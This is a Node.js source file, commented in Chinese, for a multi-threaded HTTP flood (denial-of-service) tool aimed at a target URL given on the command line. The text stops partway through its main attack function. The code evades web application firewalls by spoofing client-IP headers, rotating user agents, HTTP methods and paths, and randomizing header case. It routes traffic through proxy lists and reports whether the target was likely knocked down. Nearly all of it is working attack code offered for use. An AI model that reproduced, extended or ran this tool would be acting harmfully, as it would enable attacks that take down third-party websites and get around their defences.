'use strict';

// 自动安装依赖
const { execSync } = require('child_process');
let colors;
try {
  colors = require('colors');
} catch (err) {
  console.log('\x1b[36m[安装]\x1b[37m 正在安装依赖...');
  try {
    execSync('npm install colors', { stdio: 'inherit' });
    console.log('✅ \x1b[32m依赖安装完成，继续执行\x1b[37m');
    colors = require('colors');
  } catch (e) {
    console.log('⚠️  \x1b[33m安装colors失败，使用基础颜色输出\x1b[37m');
    colors = {
      yellow: (str) => `\x1b[33m${str}\x1b[37m`,
      red: (str) => `\x1b[31m${str}\x1b[37m`,
      green: (str) => `\x1b[32m${str}\x1b[37m`,
      cyan: (str) => `\x1b[36m${str}\x1b[37m`,
      magenta: (str) => `\x1b[35m${str}\x1b[37m`,
      blue: (str) => `\x1b[34m${str}\x1b[37m`,
    };
  }
}

// 颜色主题设置
if (colors && colors.setTheme) {
  colors.setTheme({
    info: 'cyan',
    warn: 'yellow',
    error: 'red',
    success: 'green',
    attack: 'magenta',
    stats: 'blue',
    bypass: 'rainbow',
    random: 'random',
    method: 'cyan'
  });
}

process.on('uncaughtException', function(err) {
  console.error(`[${new Date().toISOString()}] \x1b[31m未捕获异常:\x1b[37m`, err.message);
});

process.on('unhandledRejection', function(reason, promise) {
  console.error(`[${new Date().toISOString()}] \x1b[31m未处理的Promise拒绝:\x1b[37m`, reason);
});

const net = require('net');
const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const fileName = path.basename(__filename);

const UAs = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "curl/7.88.1",
  "Wget/1.21.4",
  "PostmanRuntime/7.36.3",
];

const BYPASS_HEADERS = {
  normal: {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
  },
  api: {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://www.google.com',
  },
  mobile: {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
  },
  legacy: {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-us,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
    'Connection': 'keep-alive',
  }
};

class EnhancedWAFBypass {
  constructor(enabled = false, randomSpeedEnabled = false) {
    this.enabled = enabled;
    this.randomSpeedEnabled = randomSpeedEnabled;
    this.techniques = {
      headerVariation: true,
      requestDelay: true,
      pathRandomization: true,
      methodRotation: true,
      encodingManipulation: true,
      fragmentation: true,
      caseVariation: true,
      parameterPollution: true,
      multiMethodAttack: randomSpeedEnabled,
    };
    
    this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH', 'TRACE', 'CONNECT'];
    this.methodWeights = {
      'GET': 0.35,
      'POST': 0.25,
      'PUT': 0.10,
      'DELETE': 0.10,
      'HEAD': 0.08,
      'OPTIONS': 0.05,
      'PATCH': 0.04,
      'TRACE': 0.02,
      'CONNECT': 0.01
    };
    
    this.methodSpecificHeaders = {
      'POST': {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '0'
      },
      'PUT': {
        'Content-Type': 'application/json',
        'Content-Length': '0'
      },
      'PATCH': {
        'Content-Type': 'application/json-patch+json',
        'Content-Length': '0'
      },
      'DELETE': {
        'Content-Type': 'application/json'
      }
    };
  }
  
  getRandomDelay() {
    if (!this.enabled) return 0;
    return Math.random() * 200;
  }
  
  getRandomMethod(preferredMethod = 'GET') {
    if (!this.enabled || !this.techniques.methodRotation) {
      return preferredMethod;
    }
    
    if (this.techniques.multiMethodAttack) {
      const rand = Math.random();
      let cumulative = 0;
      
      for (const [method, weight] of Object.entries(this.methodWeights)) {
        cumulative += weight;
        if (rand <= cumulative) {
          return method;
        }
      }
    } else {
      const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'];
      return Math.random() > 0.8 ? methods[Math.floor(Math.random() * methods.length)] : preferredMethod;
    }
    
    return preferredMethod;
  }
  
  getRandomMethodCombination(count = 3) {
    if (!this.techniques.multiMethodAttack) {
      return Array(count).fill('GET');
    }
    
    const methods = [];
    for (let i = 0; i < count; i++) {
      methods.push(this.getRandomMethod());
    }
    return methods;
  }
  
  getMethodSpecificBody(method) {
    if (!['POST', 'PUT', 'PATCH', 'DELETE'].includes(method)) {
      return '';
    }
    
    const bodyTypes = [
      () => JSON.stringify({
        id: Math.floor(Math.random() * 10000),
        timestamp: Date.now(),
        data: crypto.randomBytes(8).toString('hex')
      }),
      () => `action=${crypto.randomBytes(4).toString('hex')}&value=${Math.random()}`,
      () => `<?xml version="1.0"?><request><id>${Math.floor(Math.random() * 1000)}</id></request>`,
      () => `{"query":"{user(id:${Math.floor(Math.random() * 100)}){name}}","variables":{}}`,
      () => `_method=${method}&data=${crypto.randomBytes(6).toString('hex')}`
    ];
    
    return bodyTypes[Math.floor(Math.random() * bodyTypes.length)]();
  }
  
  getRandomPath(originalPath) {
    if (!this.enabled || !this.techniques.pathRandomization) {
      return originalPath;
    }
    
    const paths = [
      '/',
      '/index.html',
      '/index.php',
      '/home',
      '/main',
      '/api',
      '/api/v1',
      '/api/v2',
      '/wp-admin',
      '/wp-login.php',
      '/admin',
      '/login',
      '/user',
      '/profile',
      '/search',
      '/api/users',
      '/api/posts',
      '/robots.txt',
      '/sitemap.xml',
      '/feed',
      '/rss',
      '/atom.xml',
      '/sitemap.html',
    ];
    
    if (Math.random() > 0.3) {
      return paths[Math.floor(Math.random() * paths.length)];
    }
    return originalPath;
  }
  
  getRandomUserAgent() {
    return UAs[Math.floor(Math.random() * UAs.length)];
  }
  
  getRandomHeaders(method = 'GET') {
    const headerTypes = Object.keys(BYPASS_HEADERS);
    const selectedType = headerTypes[Math.floor(Math.random() * headerTypes.length)];
    const baseHeaders = { ...BYPASS_HEADERS[selectedType] };
    
    if (this.methodSpecificHeaders[method]) {
      Object.assign(baseHeaders, this.methodSpecificHeaders[method]);
    }
    
    if (this.enabled && this.techniques.headerVariation) {
      this.addRandomHeaders(baseHeaders);
      
      if (this.techniques.caseVariation && Math.random() > 0.5) {
        this.randomizeHeaderCase(baseHeaders);
      }
    }
    
    return baseHeaders;
  }
  
  addRandomHeaders(headers) {
    const randomHeaders = {
      'X-Forwarded-For': this.generateRandomIP(),
      'X-Real-IP': this.generateRandomIP(),
      'X-Client-IP': this.generateRandomIP(),
      'X-Forwarded-Host': 'www.google.com',
      'X-Request-ID': crypto.randomBytes(8).toString('hex'),
      'X-Correlation-ID': crypto.randomBytes(8).toString('hex'),
      'CF-Connecting-IP': this.generateRandomIP(),
      'True-Client-IP': this.generateRandomIP(),
      'X-Originating-IP': this.generateRandomIP(),
      'X-Remote-IP': this.generateRandomIP(),
      'X-Remote-Addr': this.generateRandomIP(),
      'X-Cluster-Client-IP': this.generateRandomIP(),
      'X-Wap-Profile': 'http://wap.samsungmobile.com/uaprof/SGH-I777.xml',
      'X-ATT-DeviceId': crypto.randomBytes(8).toString('hex'),
      'Proxy-Connection': 'keep-alive',
      'TE': 'Trailers',
      'DNT': Math.random() > 0.5 ? '1' : '0',
      'Save-Data': 'on',
      'Pragma': 'no-cache',
      'Cache-Control': 'no-cache, no-store, must-revalidate, max-age=0',
      'Expires': '0',
      'Via': '1.1 google',
      'CDN-Loop': 'cloudflare',
      'X-Cache': 'MISS',
      'X-Amzn-Trace-Id': `Root=${crypto.randomBytes(8).toString('hex')}`,
      'X-UIDH': crypto.randomBytes(12).toString('hex'),
      'X-Request-Start': `t=${Date.now()}`,
      'X-Csrf-Token': crypto.randomBytes(16).toString('hex'),
      'X-XSRF-TOKEN': crypto.randomBytes(16).toString('hex'),
    };
    
    const headerKeys = Object.keys(randomHeaders);
    const numHeaders = Math.floor(Math.random() * 6) + 3;
    const selectedHeaders = [];
    
    for (let i = 0; i < numHeaders; i++) {
      const randomKey = headerKeys[Math.floor(Math.random() * headerKeys.length)];
      if (!selectedHeaders.includes(randomKey)) {
        selectedHeaders.push(randomKey);
        headers[randomKey] = randomHeaders[randomKey];
      }
    }
    
    if (Math.random() > 0.3) {
      const referers = [
        'https://www.google.com/',
        'https://www.bing.com/',
        'https://www.baidu.com/',
        'https://www.yahoo.com/',
        'https://duckduckgo.com/',
        'https://www.facebook.com/',
        'https://twitter.com/',
        'https://www.reddit.com/',
        'https://github.com/',
      ];
      headers['Referer'] = referers[Math.floor(Math.random() * referers.length)];
    }
    
    return headers;
  }
  
  randomizeHeaderCase(headers) {
    const newHeaders = {};
    for (const [key, value] of Object.entries(headers)) {
      let newKey = key;
      if (Math.random() > 0.5) {
        newKey = key.split('').map(char => 
          Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()
        ).join('');
      }
      newHeaders[newKey] = value;
    }
    Object.assign(headers, newHeaders);
  }
  
  generateRandomCookies() {
    const cookies = [];
    const cookieNames = ['sessionid', 'csrftoken', 'auth_token', 'user_id', 'language', 'theme'];
    
    const numCookies = Math.floor(Math.random() * 3) + 1;
    for (let i = 0; i < numCookies; i++) {
      const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
      const value = crypto.randomBytes(8).toString('hex');
      cookies.push(`${name}=${value}`);
    }
    
    return cookies.join('; ');
  }
  
  generateEncodedParams() {
    const params = {};
    const paramNames = ['id', 'page', 'search', 'q', 'token', 'key', 'auth', 'uid'];
    
    const numParams = Math.floor(Math.random() * 4) + 1;
    for (let i = 0; i < numParams; i++) {
      const name = paramNames[Math.floor(Math.random() * paramNames.length)];
      const value = Math.random() > 0.5 
        ? crypto.randomBytes(4).toString('hex')
        : Math.floor(Math.random() * 1000).toString();
      
      if (Math.random() > 0.7) {
        params[name] = encodeURIComponent(value);
      } else if (Math.random() > 0.5) {
        params[name] = Buffer.from(value).toString('base64');
      } else {
        params[name] = value;
      }
    }
    
    return params;
  }
  
  generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
}

class EnhancedRandomSpeedController {
  constructor(multiMethodEnabled = false) {
    this.minInterval = 1;
    this.maxInterval = 100;
    this.currentInterval = this.getRandomInterval();
    this.lastChangeTime = Date.now();
    this.changeIntervalRange = { min: 30000, max: 180000 };
    this.nextChangeTime = this.lastChangeTime + this.getRandomChangeInterval();
    this.multiMethodEnabled = multiMethodEnabled;
    this.methodStats = {};
  }
  
  getRandomInterval() {
    return Math.floor(Math.random() * (this.maxInterval - this.minInterval + 1)) + this.minInterval;
  }
  
  getRandomChangeInterval() {
    return Math.floor(Math.random() * (this.changeIntervalRange.max - this.changeIntervalRange.min + 1)) + this.changeIntervalRange.min;
  }
  
  getCurrentInterval() {
    const now = Date.now();
    
    if (now >= this.nextChangeTime) {
      this.currentInterval = this.getRandomInterval();
      this.lastChangeTime = now;
      this.nextChangeTime = now + this.getRandomChangeInterval();
      
      console.log(`\x1b[33m[速度变化]\x1b[37m 新间隔: ${this.currentInterval}ms`.random);
    }
    
    return this.currentInterval;
  }
  
  recordMethodUsage(method) {
    if (!this.methodStats[method]) {
      this.methodStats[method] = 0;
    }
    this.methodStats[method]++;
  }
  
  getMethodStats() {
    return this.methodStats;
  }
  
  getSpeedDescription() {
    const requestsPerSecond = Math.round(1000 / this.currentInterval);
    return `${requestsPerSecond} 请求/秒 (间隔: ${this.currentInterval}ms)`;
  }
}

class MultiMethodAttackManager {
  constructor(wafBypass, speedController) {
    this.wafBypass = wafBypass;
    this.speedController = speedController;
    this.methodQueue = [];
    this.maxConcurrentMethods = 3;
    this.methodStats = {};
  }
  
  generateConcurrentMethods(baseMethod = 'GET') {
    if (!this.wafBypass.techniques.multiMethodAttack) {
      return [baseMethod];
    }
    
    const methodCount = Math.floor(Math.random() * this.maxConcurrentMethods) + 1;
    const methods = this.wafBypass.getRandomMethodCombination(methodCount);
    
    methods.forEach(method => {
      if (!this.methodStats[method]) {
        this.methodStats[method] = 0;
      }
      this.methodStats[method]++;
      
      if (this.speedController) {
        this.speedController.recordMethodUsage(method);
      }
    });
    
    return methods;
  }
  
  getMethodStats() {
    return this.methodStats;
  }
}

class RandomDurationGenerator {
  static getRandomDuration(minMinutes = 40, maxMinutes = 480) {
    const minMs = minMinutes * 60 * 1000;
    const maxMs = maxMinutes * 60 * 1000;
    return Math.floor(Math.random() * (maxMs - minMs + 1)) + minMs;
  }
  
  static formatDuration(ms) {
    const hours = Math.floor(ms / (1000 * 60 * 60));
    const minutes = Math.floor((ms % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((ms % (1000 * 60)) / 1000);
    
    if (hours > 0) {
      return `${hours}小时 ${minutes}分钟 ${seconds}秒`;
    } else if (minutes > 0) {
      return `${minutes}分钟 ${seconds}秒`;
    } else {
      return `${seconds}秒`;
    }
  }
}

function showFinalStats(totalRequests, failedRequests, startTime, useProxies, proxyCount, wafEnabled, randomSpeedEnabled, interval, requestsPerConnection, methodStats = {}) {
  const elapsed = (Date.now() - startTime) / 1000;
  const avgRate = elapsed > 0 ? Math.round(totalRequests / elapsed) : 0;
  const successRate = totalRequests > 0 ? ((totalRequests - failedRequests) / totalRequests * 100).toFixed(2) : 0;
  
  console.log(`
╔══════════════════════════════════════════════════════════════╗
║                     攻击统计                                ║
╚══════════════════════════════════════════════════════════════╝`.stats);
  
  console.log(`\x1b[36m[总计]\x1b[37m 总请求数: ${totalRequests}`.info);
  console.log(`\x1b[36m[失败]\x1b[37m 失败请求: ${failedRequests}`.info);
  console.log(`\x1b[36m[时间]\x1b[37m 攻击时长: ${elapsed.toFixed(2)} 秒 (${RandomDurationGenerator.formatDuration(elapsed * 1000)})`.info);
  console.log(`\x1b[36m[速率]\x1b[37m 平均速率: ${avgRate} 请求/秒`.info);
  console.log(`\x1b[36m[成功率]\x1b[37m ${successRate}%`.info);
  console.log(`\x1b[36m[模式]\x1b[37m ${useProxies ? '代理攻击 (' + proxyCount + ' 个代理)' : '直接连接'}`.info);
  console.log(`\x1b[36m[WAF绕过]\x1b[37m ${wafEnabled ? '✅ 已启用' : '❌ 未启用'}`.bypass);
  console.log(`\x1b[36m[随机速度]\x1b[37m ${randomSpeedEnabled ? '✅ 已启用' : '❌ 未启用'}`.random);
  console.log(`\x1b[36m[间隔]\x1b[37m ${interval}ms (${Math.round(1000/interval)} 请求/秒)`.info);
  console.log(`\x1b[36m[连接请求数]\x1b[37m ${requestsPerConnection} 个`.info);
  console.log(`\x1b[36m[带宽]\x1b[37m 约 ${Math.round(avgRate * 1.5 / 1024)} MB/秒`.info);
  
  if (Object.keys(methodStats).length > 0) {
    console.log(`\x1b[36m[方法统计]\x1b[37m`.method);
    const sortedMethods = Object.entries(methodStats)
      .sort(([,a], [,b]) => b - a)
      .slice(0, 10);
    
    sortedMethods.forEach(([method, count]) => {
      const percentage = ((count / totalRequests) * 100).toFixed(1);
      console.log(`  ${method}: ${count} (${percentage}%)`.method);
    });
  }
  
  if (successRate > 90) {
    console.log('\n\x1b[32m✅ 攻击成功！目标可能已受影响\x1b[37m'.success);
  } else if (successRate > 50) {
    console.log('\n\x1b[33m⚠️  攻击部分成功，目标可能承受压力\x1b[37m'.warn);
  } else {
    console.log('\n\x1b[31m❌ 攻击效果不佳，目标可能防御较强\x1b[37m'.error);
  }
}

function parseArguments() {
  const args = {
    target: null,
    proxyFile: null,
    duration: null,
    threads: null,
    method: 'GET',
    waf: false,
    randomSpeed: false,
    interval: 10,
    requestsPerConnection: 5,
  };
  
  const argv = [...process.argv];
  const wafIndex = argv.indexOf('--waf');
  if (wafIndex !== -1) {
    args.waf = true;
    argv.splice(wafIndex, 1);
  }
  
  const randomSpeedIndex = argv.indexOf('--random-speed');
  if (randomSpeedIndex !== -1) {
    args.randomSpeed = true;
    argv.splice(randomSpeedIndex, 1);
  }
  
  if (argv.length < 4) {
    console.log('\x1b[31m[错误]\x1b[37m 参数不足'.error);
    console.log('\x1b[36m[用法]\x1b[37m node ' + fileName + ' <目标URL> [代理文件] <持续时间> <线程数> [间隔(ms)] [连接请求数] [方法] [--waf] [--random-speed]'.info);
    console.log('\x1b[33m[示例]\x1b[37m'.warn);
    console.log('  node ' + fileName + ' http://example.com 60 100'.warn);
    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 5 10 GET'.warn);
    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 1 50 GET --waf'.warn);
    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 1 50 GET --waf --random-speed'.warn);
    console.log('\x1b[33m[注意]\x1b[37m'.warn);
    console.log('  --waf: 启用WAF绕过模式'.warn);
    console.log('  --random-speed: 启用随机速度和持续时间，同时启用多方法攻击'.warn);
    console.log('  间隔: 请求间隔时间(毫秒)，默认10ms'.warn);
    console.log('  连接请求数: 每个连接发送的请求数，默认5'.warn);
    console.log('  代理文件可选: 如果不提供，将使用直接连接攻击'.warn);
    return null;
  }
  
  args.target = argv[2];
  
  let paramIndex = 3;
  
  if (paramIndex < argv.length) {
    const secondArg = argv[paramIndex];
    
    if (secondArg.includes('.') && !isNaN(parseInt(secondArg.split('.')[0])) === false) {
      args.proxyFile = secondArg;
      paramIndex++;
    }
  }
  
  if (paramIndex < argv.length) {
    args.duration = parseInt(argv[paramIndex]);
    if (isNaN(args.duration)) {
      console.log('\x1b[31m[错误]\x1b[37m 持续时间必须是数字'.error);
      return null;
    }
    paramIndex++;
  } else {
    console.log('\x1b[31m[错误]\x1b[37m 缺少持续时间参数'.error);
    return null;
  }
  
  if (paramIndex < argv.length) {
    args.threads = parseInt(argv[paramIndex]);
    if (isNaN(args.threads)) {
      console.log('\x1b[31m[错误]\x1b[37m 线程数必须是数字'.error);
      return null;
    }
    paramIndex++;
  } else {
    console.log('\x1b[31m[错误]\x1b[37m 缺少线程数参数'.error);
    return null;
  }
  
  if (paramIndex < argv.length) {
    const intervalArg = argv[paramIndex];
    if (!isNaN(parseInt(intervalArg)) && intervalArg.indexOf('--') !== 0) {
      args.interval = parseInt(intervalArg);
      if (args.interval < 1) {
        console.log('\x1b[31m[错误]\x1b[37m 间隔时间必须大于0'.error);
        return null;
      }
      paramIndex++;
    }
  }
  
  if (paramIndex < argv.length) {
    const requestsArg = argv[paramIndex];
    if (!isNaN(parseInt(requestsArg)) && requestsArg.indexOf('--') !== 0) {
      args.requestsPerConnection = parseInt(requestsArg);
      if (args.requestsPerConnection < 1) {
        console.log('\x1b[31m[错误]\x1b[37m 连接请求数必须大于0'.error);
        return null;
      }
      paramIndex++;
    }
  }
  
  if (paramIndex < argv.length) {
    const methodArg = argv[paramIndex];
    if (methodArg.indexOf('--') !== 0) {
      args.method = methodArg.toUpperCase();
      paramIndex++;
    }
  }
  
  return args;
}

function sendThroughProxyEnhanced(proxyHost, proxyPort, target, parsed, methods, wafBypass, requestsPerConnection, callback) {
  const socket = new net.Socket();
  socket.setTimeout(5000);
  
  socket.once('connect', () => {
    for (let i = 0; i < Math.min(methods.length, requestsPerConnection); i++) {
      const method = methods[i % methods.length];
      const request = buildWAFBypassRequest(target, parsed, method, wafBypass);
      socket.write(request);
    }
    callback(true);
  });
  
  socket.once('error', (err) => {
    callback(false);
  });
  
  socket.once('timeout', () => {
    socket.destroy();
    callback(false);
  });
  
  socket.on('data', (data) => {
    setTimeout(() => {
      socket.destroy();
    }, 3000);
  });
  
  socket.on('close', () => {
  });
  
  try {
    socket.connect(proxyPort, proxyHost);
  } catch (err) {
    callback(false);
  }
}

function buildWAFBypassRequest(target, parsed, method, wafBypass) {
  const host = parsed.hostname;
  const randomMethod = wafBypass.getRandomMethod(method);
  const randomPath = wafBypass.getRandomPath(parsed.pathname + parsed.search);
  
  const headers = wafBypass.getRandomHeaders(randomMethod);
  headers['Host'] = host;
  headers['User-Agent'] = wafBypass.getRandomUserAgent();
  
  if (Math.random() > 0.5) {
    const cookies = wafBypass.generateRandomCookies();
    if (cookies) {
      headers['Cookie'] = cookies;
    }
  }
  
  const requestLine = `${randomMethod} ${randomPath} HTTP/1.1\r\n`;
  
  let requestHeaders = '';
  for (const [key, value] of Object.entries(headers)) {
    requestHeaders += `${key}: ${value}\r\n`;
  }
  
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(randomMethod) && Math.random() > 0.3) {
    const body = wafBypass.getMethodSpecificBody(randomMethod);
    requestHeaders += `Content-Length: ${Buffer.byteLength(body)}\r\n`;
    return requestLine + requestHeaders + '\r\n' + body;
  }
  
  return requestLine + requestHeaders + '\r\n';
}

function sendDirectRequestEnhanced(isHttps, host, port, path, methods, wafBypass, callback) {
  const method = methods[Math.floor(Math.random() * methods.length)];
  const randomMethod = wafBypass.getRandomMethod(method);
  const randomPath = wafBypass.getRandomPath(path);
  
  const headers = wafBypass.getRandomHeaders(randomMethod);
  headers['Host'] = host;
  headers['User-Agent'] = wafBypass.getRandomUserAgent();
  
  if (Math.random() > 0.5) {
    const cookies = wafBypass.generateRandomCookies();
    if (cookies) {
      headers['Cookie'] = cookies;
    }
  }
  
  const options = {
    hostname: host,
    port: port,
    path: randomPath,
    method: randomMethod,
    headers: headers,
    timeout: 5000
  };
  
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(randomMethod) && Math.random() > 0.3) {
    const body = wafBypass.getMethodSpecificBody(randomMethod);
    options.headers['Content-Length'] = Buffer.byteLength(body);
  }
  
  const req = (isHttps ? https : http).request(options, (res) => {
    res.on('data', () => {});
    res.on('end', () => {
      callback(true);
    });
  });
  
  req.on('error', (err) => {
    callback(false);
  });
  
  req.on('timeout', () => {
    req.destroy();
    callback(false);
  });
  
  if (options.headers['Content-Length']) {
    const body = wafBypass.getMethodSpecificBody(randomMethod);
    req.write(body);
  }
  
  req.end();
}

function enhancedAttackWorker(id, target, parsed, method, proxies, useProxies, wafBypass, speedController, multiMethodManager, workerDuration, interval, requestsPerConnection, callback) {
  let workerRequests = 0;
  let workerFailed = 0;
  const host = parsed.hostname;
  const port = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
  const isHttps = parsed.protocol === 'https:';
  const path = parsed.pathname + parsed.search;
  
  const endTime = Date.now() + workerDuration;
  let isRunning = true;
  
  const attackLoop = () => {
    if (!isRunning || Date.now() >= endTime) {
      isRunning = false;
      callback(workerRequests, workerFailed);
      return;
    }
    
    const currentInterval = speedController ? speedController.getCurrentInterval() : interval;
    
    const concurrentMethods = multiMethodManager.generateConcurrentMethods(method);
    
    if (useProxies && proxies.length > 0) {
      const proxy = proxies[Math.floor(Math.random() * proxies.length)];
      
      sendThroughProxyEnhanced(proxy.host, proxy.port, target, parsed, concurrentMethods, wafBypass, requestsPerConnection, (success) => {
        if (success) {
          workerRequests += Math.min(concurrentMethods.length, requestsPerConnection);
        } else {
          workerFailed += Math.min(concurrentMethods.length, requestsPerConnection);
        }
      });
    } else {
      let completed = 0;
      let successCount = 0;
      let failCount = 0;
      
      const checkCompletion = () => {
        if (completed === concurrentMethods.length) {
          workerRequests += successCount;
          workerFailed += failCount;
        }
      };
      
      concurrentMethods.forEach(methodToUse => {
        sendDirectRequestEnhanced(isHttps, host, port, path, [methodToUse], wafBypass, (success) => {
          completed++;
          if (success) {
            successCount++;
          } else {
            failCount++;
          }
          checkCompletion();
        });
      });
    }
    
    setTimeout(attackLoop, currentInterval);
  };
  
  attackLoop();
  
  if (useProxies) {
    const directLoop = () => {
      if (!isRunning || Date.now() >= endTime) {
        return;
      }
      
      const concurrentMethods = multiMethodManager.generateConcurrentMethods(method);
      
      let completed = 0;
      let successCount = 0;
      let failCount = 0;
      
      const checkCompletion = () => {
        if (completed === concurrentMethods.length) {
          workerRequests += successCount;
          workerFailed += failCount;
        }
      };
      
      concurrentMethods.forEach(methodToUse => {
        sendDirectRequestEnhanced(isHttps, host, port, path, [methodToUse], wafBypass, (success) => {
          completed++;
          if (success) {
            successCount++;
          } else {
            failCount++;
          }
          checkCompletion();
        });
      });
      
      const directInterval = speedController ? speedController.getCurrentInterval() * 2 : interval * 2;
      setTimeout(directLoop, directInterval);
    };
    
    directLoop();
  }
  
  return () => {
    isRunning = false;
  };
}

function startEnhancedAttack() {
  const args = parseArguments();
  if (!args) {
    process.exit(1);
  }
  
  const target = args.target;
  const proxyFile = args.proxyFile;
  const duration = args.duration;
  const threads = args.threads;
  const method = args.method;
  const wafEnabled = args.waf;
  const randomSpeedEnabled = args.randomSpeed;
  const interval = args.interval;
  const requestsPerConnection = args.requestsPerConnection;

  if (!target) {
    console.log('\x1b[31m[错误]\x1b[37m 目标URL是必须的'.error);
    process.exit(1);
  }

  if (!target.startsWith('http://') && !target.startsWith('https://')) {
    console.log('\x1b[31m[错误]\x1b[37m 目标必须以 http:// 或 https:// 开头'.error);
    process.exit(1);
  }

  if (isNaN(duration) || duration <= 0) {
    console.log('\x1b[31m[错误]\x1b[37m 持续时间必须是正整数'.error);
    process.exit(1);
  }

  if (isNaN(threads) || threads <= 0) {
    console.log('\x1b[31m[错误]\x1b[37m 线程数必须是正整数'.error);
    process.exit(1);
  }

  if (interval < 1) {
    console.log('\x1b[31m[错误]\x1b[37m 间隔时间必须大于0'.error);
    process.exit(1);
  }

  if (requestsPerConnection < 1) {
    console.log('\x1b[31m[错误]\x1b[37m 连接请求数必须大于0'.error);
    process.exit(1);
  }

  let parsed;
  try {
    parsed = new URL(target);
  } catch (err) {
    console.log('\x1b[31m[错误]\x1b[37m 无效的URL: ' + err.message.error);
    process.exit(1);
  }

  let proxies = [];
  let useProxies = false;
  
  if (proxyFile) {
    try {
      const proxyContent = fs.readFileSync(proxyFile, 'utf-8');
      proxies = proxyContent
        .replace(/\r/g, '')
        .split('\n')
        .filter(line => line.trim() !== '')
        .map(line => {
          const parts = line.trim().split(':');
          return {
            host: parts[0],
            port: parseInt(parts[1]) || 80
          };
        });
      
      if (proxies.length === 0) {
        console.log(`\x1b[33m[警告]\x1b[37m 代理文件为空，将使用直接连接`.warn);
      } else {
        useProxies = true;
        console.log(`\x1b[36m[加载]\x1b[37m 成功加载 ${proxies.length} 个代理`.info);
      }
    } catch (err) {
      if (err.code === 'ENOENT') {
        console.log(`\x1b[33m[警告]\x1b[37m 代理文件不存在: ${proxyFile}，将使用直接连接`.warn);
      } else {
        console.log(`\x1b[33m[警告]\x1b[37m 读取代理文件失败: ${err.message}，将使用直接连接`.warn);
      }
    }
  } else {
    console.log('\x1b[33m[信息]\x1b[37m 未提供代理文件，使用直接连接攻击'.info);
  }

  const wafBypass = new EnhancedWAFBypass(wafEnabled, randomSpeedEnabled);
  
  const baseDuration = duration * 1000;
  const workerDurations = [];
  const speedControllers = [];
  const multiMethodManagers = [];
  const stopFunctions = [];
  
  for (let i = 0; i < threads; i++) {
    const workerDuration = randomSpeedEnabled 
      ? RandomDurationGenerator.getRandomDuration(40, Math.max(40, Math.ceil(duration / 60)))
      : baseDuration;
    
    workerDurations.push(workerDuration);
    speedControllers.push(randomSpeedEnabled ? new EnhancedRandomSpeedController(true) : { getCurrentInterval: () => interval });
    multiMethodManagers.push(new MultiMethodAttackManager(wafBypass, speedControllers[i]));
  }
  
  const maxWorkerDuration = Math.max(...workerDurations);
